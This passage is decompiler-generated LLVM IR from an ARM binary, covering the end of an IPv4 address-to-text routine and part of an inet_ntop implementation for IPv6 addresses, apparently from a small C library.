  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1d01c = ptrtoint i32* %stack_var_-40 to i32
  %v2_1cffc = add i32 %v2_1d01c, -17
  br label %dec_label_pc_1d01c

dec_label_pc_1cf6c:                               ; preds = %dec_label_pc_1d01c
  %v0_1cf6c = load i32, i32* %fp.global-to-local, align 4
  %v2_1cf6c = add i32 %v0_1cf6c, %v1_1cf6c
  %v3_1cf6c = inttoptr i32 %v2_1cf6c to i8*
  %v4_1cf6c = load i8, i8* %v3_1cf6c, align 1
  %v6_1cf6c = zext i8 %v4_1cf6c to i32
  store i32 %v6_1cf6c, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1cf6c, 100
  %v2_1cf74 = zext i8 %div4 to i32
  store i32 %v2_1cf74, i32* %r0.global-to-local, align 4
  %v1_1cf78 = or i8 %div4, 48
  %v3_1cf7c = add i32 %v2_1d02c, -17
  %v4_1cf7c = inttoptr i32 %v3_1cf7c to i8*
  store i8 %v1_1cf78, i8* %v4_1cf7c, align 1
  %v0_1cf80 = load i32, i32* %r5.global-to-local, align 4
  %v1_1cf80 = add i32 %v0_1cf80, -17
  %v2_1cf80 = inttoptr i32 %v1_1cf80 to i8*
  %v3_1cf80 = load i8, i8* %v2_1cf80, align 1
  %v0_1cf84 = load i32, i32* %r6.global-to-local, align 4
  %v1_1cf84 = add i32 %v0_1cf84, 1
  store i32 %v1_1cf84, i32* %r6.global-to-local, align 4
  store i32 %v2_1d01c, i32* %r2.global-to-local, align 4
  %v7_1cf8c = icmp eq i8 %v3_1cf80, 48
  %v0_1cf94 = load i32, i32* %r4.global-to-local, align 4
  %v0_1cf9c = load i32, i32* %fp.global-to-local, align 4
  %v1_1cf9c = load i32, i32* %sl.global-to-local, align 4
  %v2_1cf9c = add i32 %v1_1cf9c, %v0_1cf9c
  store i32 %v2_1cf9c, i32* %sb.global-to-local, align 4
  %v2_1cfa4 = udiv i32 %v0_1cf94, 10
  %v1_1cfac = urem i32 %v2_1cfa4, 256
  %v2_1cfb0 = udiv i32 %v1_1cfac, 10
  %v3_1cfb0 = urem i32 %v1_1cfac, 10
  store i32 %v2_1cfb0, i32* %r0.global-to-local, align 4
  %v1_1cfb4 = or i32 %v3_1cfb0, 48
  br i1 %v7_1cf8c, label %dec_label_pc_1cfa4, label %dec_label_pc_1cfcc

dec_label_pc_1cfa4:                               ; preds = %dec_label_pc_1cf6c
  %v7_1cfbc = icmp eq i32 %v1_1cfb4, 48
  br i1 %v7_1cfbc, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1cfa4
  store i32 %v1_1cf84, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1cfa4, %bb
  %v1_1cfc4 = trunc i32 %v1_1cfb4 to i8
  store i8 %v1_1cfc4, i8* %v2_1cf80, align 1
  %v0_1cff8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cfe8

dec_label_pc_1cfcc:                               ; preds = %dec_label_pc_1cf6c
  %v2_1cf98 = add i32 %v1_1cf84, %v2_1d01c
  %v1_1cfe0 = trunc i32 %v1_1cfb4 to i8
  %v3_1cfe0 = add i32 %v2_1cf98, -17
  %v4_1cfe0 = inttoptr i32 %v3_1cfe0 to i8*
  store i8 %v1_1cfe0, i8* %v4_1cfe0, align 1
  %v0_1cfe4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1cfe4 = add i32 %v0_1cfe4, 1
  store i32 %v1_1cfe4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1cfe8

dec_label_pc_1cfe8:                               ; preds = %bb18, %dec_label_pc_1cfcc
  %v0_1cff8 = phi i32 [ %v0_1cff8.pre, %bb18 ], [ %v1_1cfe4, %dec_label_pc_1cfcc ]
  %v0_1cfe8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1cfe8 = inttoptr i32 %v0_1cfe8 to i8*
  %v2_1cfe8 = load i8, i8* %v1_1cfe8, align 1
  %tmp19 = urem i8 %v2_1cfe8, 10
  store i32 %v2_1d01c, i32* %ip.global-to-local, align 4
  %v1_1cff8 = add i32 %v0_1cff8, 1
  store i32 %v1_1cff8, i32* %r0.global-to-local, align 4
  %v1_1d000 = or i8 %tmp19, 48
  %v3_1d004 = add i32 %v2_1cffc, %v0_1cff8
  %v4_1d004 = inttoptr i32 %v3_1d004 to i8*
  store i8 %v1_1d000, i8* %v4_1d004, align 1
  %v0_1d008 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d008 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d008 = add i32 %v1_1d008, %v0_1d008
  store i32 %v2_1d008, i32* %r2.global-to-local, align 4
  %v3_1d010 = add i32 %v2_1d008, -17
  %v4_1d010 = inttoptr i32 %v3_1d010 to i8*
  store i8 46, i8* %v4_1d010, align 1
  %v0_1d014 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d014 = add i32 %v0_1d014, 1
  store i32 %v1_1d014, i32* %r6.global-to-local, align 4
  %v0_1d018 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d018 = add i32 %v0_1d018, 1
  store i32 %v1_1d018, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1d01c

dec_label_pc_1d01c:                               ; preds = %entry, %dec_label_pc_1cfe8
  %v0_1d028 = phi i32 [ 0, %entry ], [ %v1_1d014, %dec_label_pc_1cfe8 ]
  %v1_1cf6c = phi i32 [ 0, %entry ], [ %v1_1d018, %dec_label_pc_1cfe8 ]
  store i32 %v2_1d01c, i32* %ip.global-to-local, align 4
  store i32 %v0_1d028, i32* %r7.global-to-local, align 4
  %v2_1d02c = add i32 %v0_1d028, %v2_1d01c
  store i32 %v2_1d02c, i32* %r5.global-to-local, align 4
  %v7_1d030 = icmp sgt i32 %v1_1cf6c, 3
  br i1 %v7_1d030, label %dec_label_pc_1d034, label %dec_label_pc_1cf6c

dec_label_pc_1d034:                               ; preds = %dec_label_pc_1d01c
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1d038 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1d038, i32* %r4.global-to-local, align 4
  %v3_1d03c = add i32 %v2_1d02c, -18
  %v4_1d03c = inttoptr i32 %v3_1d03c to i8*
  store i8 0, i8* %v4_1d03c, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1d038, i32* %r0.global-to-local, align 4
  %v3_1d044 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1d044, i32* %r0.global-to-local, align 4
  %v2_1d048 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1d048, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1d044, %v2_1d048
  br i1 %tmp, label %dec_label_pc_1d054, label %dec_label_pc_1d068

dec_label_pc_1d054:                               ; preds = %dec_label_pc_1d034
  %v0_1d054 = call i32 @__GI___errno_location()
  store i32 %v0_1d054, i32* %r0.global-to-local, align 4
  %v0_1d05c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1d05c, i32* %r2.global-to-local, align 4
  %v2_1d060 = inttoptr i32 %v0_1d054 to i32*
  store i32 28, i32* %v2_1d060, align 4
  %v0_1d078.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d078

dec_label_pc_1d068:                               ; preds = %dec_label_pc_1d034
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1d038, i32* @r1, align 4
  %v2_1d070 = inttoptr i32 %arg2 to i8*
  %v3_1d070 = call i32 @strcpy(i8* %v2_1d070, i32 %v2_1d038)
  store i32 %v3_1d070, i32* %r0.global-to-local, align 4
  store i32 %v3_1d070, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d078

dec_label_pc_1d078:                               ; preds = %dec_label_pc_1d054, %dec_label_pc_1d068
  %v0_1d078 = phi i32 [ %v0_1d078.pre, %dec_label_pc_1d054 ], [ %v3_1d070, %dec_label_pc_1d068 ]
  store i32 %v0_1d078, i32* %r0.global-to-local, align 4
  ret i32 %v0_1d078

; uselistorder directives
  uselistorder i32 %v0_1d078, { 1, 0 }
  uselistorder i32 %v2_1d038, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1d02c, { 0, 2, 1 }
  uselistorder i32 %v1_1cf6c, { 1, 0 }
  uselistorder i32 %v1_1cfb4, { 1, 0, 2 }
  uselistorder i32 %v2_1d01c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1d078, { 1, 0 }
  uselistorder label %dec_label_pc_1d01c, { 1, 0 }
  uselistorder label %dec_label_pc_1cfe8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1d088 = load i32, i32* @r5, align 4
  %v7_1d094 = icmp eq i32 %arg1, 2
  store i1 %v7_1d094, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1d094, label %dec_label_pc_1d0b8, label %dec_label_pc_1d0ac

dec_label_pc_1d0ac:                               ; preds = %entry
  %v7_1d0ac = icmp eq i32 %arg1, 10
  store i1 %v7_1d0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d0ac, label %dec_label_pc_1d0cc, label %dec_label_pc_1d2e0

dec_label_pc_1d0b8:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1d0c4 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1d2d8

dec_label_pc_1d0cc:                               ; preds = %dec_label_pc_1d0ac
  %v2_1d0cc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1d0cc, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1d0d8 = bitcast i32* %stack_var_-72 to i8*
  %v3_1d0d8 = call i32 @__GI_memset(i8* %v2_1d0d8, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1d0fc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1d0e0

dec_label_pc_1d0e0:                               ; preds = %dec_label_pc_1d0e0.dec_label_pc_1d0e0_crit_edge, %dec_label_pc_1d0cc
  %v0_1d0f8 = phi i32 [ %v0_1d0e0.pre, %dec_label_pc_1d0e0.dec_label_pc_1d0e0_crit_edge ], [ 0, %dec_label_pc_1d0cc ]
  %v1_1d0e0 = load i32, i32* @r8, align 4
  %v2_1d0e0 = add i32 %v1_1d0e0, %v0_1d0f8
  %v3_1d0e4 = inttoptr i32 %v2_1d0e0 to i8*
  %v4_1d0e4 = load i8, i8* %v3_1d0e4, align 1
  %v6_1d0e4 = zext i8 %v4_1d0e4 to i32
  %v1_1d0e8 = add i32 %v2_1d0e0, 1
  %v2_1d0e8 = inttoptr i32 %v1_1d0e8 to i8*
  %v3_1d0e8 = load i8, i8* %v2_1d0e8, align 1
  %v4_1d0e8 = zext i8 %v3_1d0e8 to i32
  %tmp74 = icmp slt i32 %v0_1d0f8, 0
  %v4_1d0ec = zext i1 %tmp74 to i32
  %v5_1d0ec = add i32 %v4_1d0ec, %v0_1d0f8
  %v4_1d0f0 = mul nuw nsw i32 %v6_1d0e4, 256
  %v5_1d0f0 = or i32 %v4_1d0e8, %v4_1d0f0
  store i32 %v5_1d0f0, i32* %r2.global-to-local, align 4
  %v3_1d0f4 = sdiv i32 %v5_1d0ec, 2
  %v1_1d0f8 = add i32 %v0_1d0f8, 2
  store i32 %v1_1d0f8, i32* %r0.global-to-local, align 4
  %v4_1d100 = mul i32 %v3_1d0f4, 4
  %v5_1d100 = add i32 %v4_1d100, %v2_1d0fc
  %v7_1d104 = icmp eq i32 %v1_1d0f8, 15
  store i1 %v7_1d104, i1* %cpsr_z.global-to-local, align 1
  %v2_1d108 = add i32 %v5_1d100, -32
  %v3_1d108 = inttoptr i32 %v2_1d108 to i32*
  store i32 %v5_1d0f0, i32* %v3_1d108, align 4
  %v7_1d10c = icmp sgt i32 %v1_1d0f8, 15
  br i1 %v7_1d10c, label %dec_label_pc_1d110, label %dec_label_pc_1d0e0.dec_label_pc_1d0e0_crit_edge

dec_label_pc_1d0e0.dec_label_pc_1d0e0_crit_edge:  ; preds = %dec_label_pc_1d0e0
  %v0_1d0e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d0e0

dec_label_pc_1d110:                               ; preds = %dec_label_pc_1d0e0
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d128

dec_label_pc_1d128:                               ; preds = %dec_label_pc_1d110, %dec_label_pc_1d174
  %v0_1d168 = phi i32 [ -1, %dec_label_pc_1d110 ], [ %v0_1d19c, %dec_label_pc_1d174 ]
  %v0_1d158 = phi i32 [ -1, %dec_label_pc_1d110 ], [ %v0_1d188, %dec_label_pc_1d174 ]
  %v0_1d13c = phi i32 [ -1, %dec_label_pc_1d110 ], [ %v0_1d13c7, %dec_label_pc_1d174 ]
  %v0_1d174 = phi i32 [ 0, %dec_label_pc_1d110 ], [ %v1_1d174, %dec_label_pc_1d174 ]
  %v4_1d12c = mul nuw nsw i32 %v0_1d174, 4
  %v5_1d12c = add i32 %v4_1d12c, %v2_1d0fc
  %v1_1d130 = add i32 %v5_1d12c, -32
  %v2_1d130 = inttoptr i32 %v1_1d130 to i32*
  %v3_1d130 = load i32, i32* %v2_1d130, align 4
  %v2_1d134 = icmp eq i32 %v3_1d130, 0
  %v7_1d13c = icmp eq i32 %v0_1d13c, -1
  br i1 %v2_1d134, label %dec_label_pc_1d13c, label %dec_label_pc_1d150

dec_label_pc_1d13c:                               ; preds = %dec_label_pc_1d128
  br i1 %v7_1d13c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1d13c
  store i32 %v0_1d174, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1d174

.thread:                                          ; preds = %dec_label_pc_1d13c
  %v1_1d148.pre = load i32, i32* @r4, align 4
  %v2_1d148 = add i32 %v1_1d148.pre, 1
  store i32 %v2_1d148, i32* @r4, align 4
  br label %dec_label_pc_1d174

dec_label_pc_1d150:                               ; preds = %dec_label_pc_1d128
  br i1 %v7_1d13c, label %dec_label_pc_1d174, label %dec_label_pc_1d158

dec_label_pc_1d158:                               ; preds = %dec_label_pc_1d150
  %v7_1d158 = icmp eq i32 %v0_1d158, -1
  %v0_1d16c.pre = load i32, i32* @r4, align 4
  %v1_1d160 = load i32, i32* @r7, align 4
  %v7_1d164 = icmp sgt i32 %v0_1d16c.pre, %v1_1d160
  %or.cond = or i1 %v7_1d158, %v7_1d164
  br i1 %or.cond, label %dec_label_pc_1d168, label %dec_label_pc_1d170

dec_label_pc_1d168:                               ; preds = %dec_label_pc_1d158
  store i32 %v0_1d168, i32* @r6, align 4
  store i32 %v0_1d16c.pre, i32* @r7, align 4
  br label %dec_label_pc_1d170

dec_label_pc_1d170:                               ; preds = %dec_label_pc_1d158, %dec_label_pc_1d168
  %v0_1d15812 = phi i32 [ %v0_1d168, %dec_label_pc_1d168 ], [ %v0_1d158, %dec_label_pc_1d158 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d174

dec_label_pc_1d174:                               ; preds = %bb, %.thread, %dec_label_pc_1d150, %dec_label_pc_1d170
  %v0_1d19c = phi i32 [ %v0_1d168, %.thread ], [ %v0_1d174, %bb ], [ %v0_1d168, %dec_label_pc_1d150 ], [ -1, %dec_label_pc_1d170 ]
  %v0_1d13c7 = phi i32 [ %v0_1d13c, %.thread ], [ %v0_1d174, %bb ], [ -1, %dec_label_pc_1d150 ], [ -1, %dec_label_pc_1d170 ]
  %v0_1d188 = phi i32 [ %v0_1d158, %.thread ], [ %v0_1d158, %bb ], [ %v0_1d158, %dec_label_pc_1d150 ], [ %v0_1d15812, %dec_label_pc_1d170 ]
  %v1_1d174 = add nuw nsw i32 %v0_1d174, 1
  %v7_1d17c = icmp slt i32 %v1_1d174, 8
  br i1 %v7_1d17c, label %dec_label_pc_1d128, label %dec_label_pc_1d180

dec_label_pc_1d180:                               ; preds = %dec_label_pc_1d174
  %v7_1d180 = icmp eq i32 %v0_1d19c, -1
  store i1 %v7_1d180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d180, label %dec_label_pc_1d180.dec_label_pc_1d1a0_crit_edge, label %dec_label_pc_1d188

dec_label_pc_1d180.dec_label_pc_1d1a0_crit_edge:  ; preds = %dec_label_pc_1d180
  %v1_1d1c4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1d1a0

dec_label_pc_1d188:                               ; preds = %dec_label_pc_1d180
  %v7_1d188 = icmp eq i32 %v0_1d188, -1
  store i1 %v7_1d188, i1* %cpsr_z.global-to-local, align 1
  %v0_1d198.pre = load i32, i32* @r4, align 4
  br i1 %v7_1d188, label %dec_label_pc_1d198, label %dec_label_pc_1d190

dec_label_pc_1d190:                               ; preds = %dec_label_pc_1d188
  %v1_1d190 = load i32, i32* @r7, align 4
  %v9_1d190 = icmp eq i32 %v0_1d198.pre, %v1_1d190
  store i1 %v9_1d190, i1* %cpsr_z.global-to-local, align 1
  %v7_1d194 = icmp sgt i32 %v0_1d198.pre, %v1_1d190
  br i1 %v7_1d194, label %dec_label_pc_1d198, label %dec_label_pc_1d1a0

dec_label_pc_1d198:                               ; preds = %dec_label_pc_1d188, %dec_label_pc_1d190
  store i32 %v0_1d198.pre, i32* @r7, align 4
  store i32 %v0_1d19c, i32* @r6, align 4
  br label %dec_label_pc_1d1a0

dec_label_pc_1d1a0:                               ; preds = %dec_label_pc_1d180.dec_label_pc_1d1a0_crit_edge, %dec_label_pc_1d190, %dec_label_pc_1d198
  %v1_1d1c4.pre = phi i32 [ %v1_1d190, %dec_label_pc_1d190 ], [ %v1_1d1c4.pre.pre, %dec_label_pc_1d180.dec_label_pc_1d1a0_crit_edge ], [ %v0_1d198.pre, %dec_label_pc_1d198 ]
  %v0_1d1a0 = phi i32 [ %v0_1d188, %dec_label_pc_1d190 ], [ %v0_1d188, %dec_label_pc_1d180.dec_label_pc_1d1a0_crit_edge ], [ %v0_1d19c, %dec_label_pc_1d198 ]
  %v7_1d1a0 = icmp eq i32 %v0_1d1a0, -1
  store i1 %v7_1d1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d1a0, label %dec_label_pc_1d1a0._crit_edge, label %dec_label_pc_1d1a8

dec_label_pc_1d1a8:                               ; preds = %dec_label_pc_1d1a0
  %v7_1d1a8 = icmp eq i32 %v1_1d1c4.pre, 1
  store i1 %v7_1d1a8, i1* %cpsr_z.global-to-local, align 1
  %v7_1d1ac = icmp slt i32 %v1_1d1c4.pre, 2
  br i1 %v7_1d1ac, label %bb54, label %dec_label_pc_1d1a0._crit_edge

bb54:                                             ; preds = %dec_label_pc_1d1a8
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1d1a0._crit_edge

dec_label_pc_1d1a0._crit_edge:                    ; preds = %dec_label_pc_1d1a0, %dec_label_pc_1d1a8, %bb54
  %v0_1d1c4 = phi i32 [ %v0_1d1a0, %dec_label_pc_1d1a8 ], [ -1, %bb54 ], [ %v0_1d1a0, %dec_label_pc_1d1a0 ]
  %v2_1d1b4 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1d1b4, i32* @r4, align 4
  %v0_1d1b8 = load i32, i32* @r5, align 4
  %v2_1d1b8 = add i32 %v0_1d1b8, -32976
  store i32 %v2_1d1b8, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1d1c4 = add i32 %v0_1d1c4, %v1_1d1c4.pre
  store i32 %v2_1d1c4, i32* @sl, align 4
  %v9_1d224 = icmp eq i32 %tmp, 65535
  %v7_1d1cc68 = icmp eq i32 %v0_1d1c4, -1
  store i1 %v7_1d1cc68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d1cc

dec_label_pc_1d1cc:                               ; preds = %dec_label_pc_1d1a0._crit_edge, %dec_label_pc_1d27c
  %v7_1d1cc72 = phi i1 [ %v7_1d1cc68, %dec_label_pc_1d1a0._crit_edge ], [ %v7_1d1cc, %dec_label_pc_1d27c ]
  %v0_1d1f871 = phi i32 [ 0, %dec_label_pc_1d1a0._crit_edge ], [ %v1_1d27c, %dec_label_pc_1d27c ]
  %v1_1d1e470 = phi i32 [ %v0_1d1c4, %dec_label_pc_1d1a0._crit_edge ], [ %v0_1d1cc.pre, %dec_label_pc_1d27c ]
  %v2_1d1fc69 = phi i32 [ %v2_1d1b4, %dec_label_pc_1d1a0._crit_edge ], [ %v3_1d1e829, %dec_label_pc_1d27c ]
  br i1 %v7_1d1cc72, label %dec_label_pc_1d1f0, label %dec_label_pc_1d1d4

dec_label_pc_1d1d4:                               ; preds = %dec_label_pc_1d1cc
  %v9_1d1d4 = icmp eq i32 %v0_1d1f871, %v1_1d1e470
  store i1 %v9_1d1d4, i1* %cpsr_z.global-to-local, align 1
  %v5_1d1d8 = icmp slt i32 %v0_1d1f871, %v1_1d1e470
  br i1 %v5_1d1d8, label %dec_label_pc_1d1f0, label %dec_label_pc_1d1dc

dec_label_pc_1d1dc:                               ; preds = %dec_label_pc_1d1d4
  %v1_1d1dc = load i32, i32* @sl, align 4
  %v9_1d1dc = icmp eq i32 %v0_1d1f871, %v1_1d1dc
  store i1 %v9_1d1dc, i1* %cpsr_z.global-to-local, align 1
  %v6_1d1e0 = icmp slt i32 %v0_1d1f871, %v1_1d1dc
  br i1 %v6_1d1e0, label %dec_label_pc_1d1e4, label %dec_label_pc_1d1f0

dec_label_pc_1d1e4:                               ; preds = %dec_label_pc_1d1dc
  store i1 %v9_1d1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1d1d4, label %bb56, label %dec_label_pc_1d27c

bb56:                                             ; preds = %dec_label_pc_1d1e4
  %v1_1d1e8 = load i32, i32* @sb, align 4
  %v2_1d1e8 = trunc i32 %v1_1d1e8 to i8
  %v4_1d1e8 = inttoptr i32 %v2_1d1fc69 to i8*
  store i8 %v2_1d1e8, i8* %v4_1d1e8, align 1
  %v5_1d1e8 = load i32, i32* @r4, align 4
  %v6_1d1e8 = add i32 %v5_1d1e8, 1
  store i32 %v6_1d1e8, i32* @r4, align 4
  br label %dec_label_pc_1d27c

dec_label_pc_1d1f0:                               ; preds = %dec_label_pc_1d1dc, %dec_label_pc_1d1d4, %dec_label_pc_1d1cc
  %v2_1d1f0 = icmp eq i32 %v0_1d1f871, 0
  store i1 %v2_1d1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d1f0, label %dec_label_pc_1d260, label %dec_label_pc_1d1f8

dec_label_pc_1d1f8:                               ; preds = %dec_label_pc_1d1f0
  %v7_1d1f8 = icmp eq i32 %v0_1d1f871, 6
  store i1 %v7_1d1f8, i1* %cpsr_z.global-to-local, align 1
  %v0_1d1fc = load i32, i32* @sb, align 4
  %v1_1d1fc = trunc i32 %v0_1d1fc to i8
  %v3_1d1fc = inttoptr i32 %v2_1d1fc69 to i8*
  store i8 %v1_1d1fc, i8* %v3_1d1fc, align 1
  %v4_1d1fc = load i32, i32* @r4, align 4
  %v5_1d1fc = add i32 %v4_1d1fc, 1
  store i32 %v5_1d1fc, i32* @r4, align 4
  %v0_1d200 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1d200, label %dec_label_pc_1d204, label %dec_label_pc_1d260

dec_label_pc_1d204:                               ; preds = %dec_label_pc_1d1f8
  %v0_1d204 = load i32, i32* @r6, align 4
  %v2_1d204 = icmp eq i32 %v0_1d204, 0
  store i1 %v2_1d204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d204, label %dec_label_pc_1d20c, label %dec_label_pc_1d260

dec_label_pc_1d20c:                               ; preds = %dec_label_pc_1d204
  %v0_1d20c = load i32, i32* @r7, align 4
  %v7_1d20c = icmp eq i32 %v0_1d20c, 6
  store i1 %v7_1d20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d20c, label %dec_label_pc_1d22c, label %dec_label_pc_1d214

dec_label_pc_1d214:                               ; preds = %dec_label_pc_1d20c
  %v7_1d214 = icmp eq i32 %v0_1d20c, 5
  store i1 %v7_1d214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d214, label %dec_label_pc_1d21c, label %dec_label_pc_1d260

dec_label_pc_1d21c:                               ; preds = %dec_label_pc_1d214
  store i1 %v9_1d224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1d224, label %dec_label_pc_1d22c, label %dec_label_pc_1d260

dec_label_pc_1d22c:                               ; preds = %dec_label_pc_1d21c, %dec_label_pc_1d20c
  %v2_1d230 = sub i32 %v2_1d0fc, %v5_1d1fc
  %v1_1d234 = add i32 %v2_1d230, -32
  store i32 %v1_1d234, i32* %r2.global-to-local, align 4
  %v0_1d238 = load i32, i32* @r8, align 4
  %v1_1d238 = add i32 %v0_1d238, 12
  store i32 %v1_1d238, i32* %r0.global-to-local, align 4
  %v3_1d240 = call i32 @inet_ntop4(i32 %v1_1d238, i32 %v5_1d1fc, i32 %v1_1d234)
  store i32 %v3_1d240, i32* %r0.global-to-local, align 4
  %v2_1d244 = icmp eq i32 %v3_1d240, 0
  store i1 %v2_1d244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d244, label %bb57, label %dec_label_pc_1d250

bb57:                                             ; preds = %dec_label_pc_1d22c
  %v1_1d248 = load i32, i32* @r6, align 4
  store i32 %v1_1d248, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d2f0

dec_label_pc_1d250:                               ; preds = %dec_label_pc_1d22c
  %v0_1d250 = load i32, i32* @r4, align 4
  %v1_1d250 = inttoptr i32 %v0_1d250 to i8*
  store i32 %v0_1d250, i32* %r0.global-to-local, align 4
  %v3_1d254 = call i32 @strlen(i8* %v1_1d250)
  store i32 %v3_1d254, i32* %r0.global-to-local, align 4
  %v0_1d258 = load i32, i32* @r4, align 4
  %v2_1d258 = add i32 %v0_1d258, %v3_1d254
  store i32 %v2_1d258, i32* @r4, align 4
  %v0_1d290.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1d290

dec_label_pc_1d260:                               ; preds = %dec_label_pc_1d21c, %dec_label_pc_1d214, %dec_label_pc_1d204, %dec_label_pc_1d1f8, %dec_label_pc_1d1f0
  %v0_1d268 = phi i32 [ %v5_1d1fc, %dec_label_pc_1d21c ], [ %v5_1d1fc, %dec_label_pc_1d214 ], [ %v5_1d1fc, %dec_label_pc_1d204 ], [ %v5_1d1fc, %dec_label_pc_1d1f8 ], [ %v2_1d1fc69, %dec_label_pc_1d1f0 ]
  store i32 %v2_1d0fc, i32* @lr, align 4
  %v1_1d264 = load i32, i32* @r5, align 4
  %v4_1d264 = mul i32 %v1_1d264, 4
  %v5_1d264 = add i32 %v4_1d264, %v2_1d0fc
  store i32 %v0_1d268, i32* @r0, align 4
  %v1_1d26c = add i32 %v5_1d264, -32
  %v2_1d26c = inttoptr i32 %v1_1d26c to i32*
  %v3_1d26c = load i32, i32* %v2_1d26c, align 4
  store i32 %v3_1d26c, i32* %r2.global-to-local, align 4
  %v0_1d270 = load i32, i32* @fp, align 4
  %v2_1d274 = call i32 @sprintf(i32 %v0_1d268, i32 %v0_1d270)
  store i32 %v2_1d274, i32* %r0.global-to-local, align 4
  %v0_1d278 = load i32, i32* @r4, align 4
  %v2_1d278 = add i32 %v0_1d278, %v2_1d274
  store i32 %v2_1d278, i32* @r4, align 4
  br label %dec_label_pc_1d27c

dec_label_pc_1d27c:                               ; preds = %bb56, %dec_label_pc_1d1e4, %dec_label_pc_1d260
  %v3_1d1e829 = phi i32 [ %v6_1d1e8, %bb56 ], [ %v2_1d1fc69, %dec_label_pc_1d1e4 ], [ %v2_1d278, %dec_label_pc_1d260 ]
  %v0_1d27c = load i32, i32* @r5, align 4
  %v1_1d27c = add i32 %v0_1d27c, 1
  store i32 %v1_1d27c, i32* @r5, align 4
  %v0_1d1cc.pre = load i32, i32* @r6, align 4
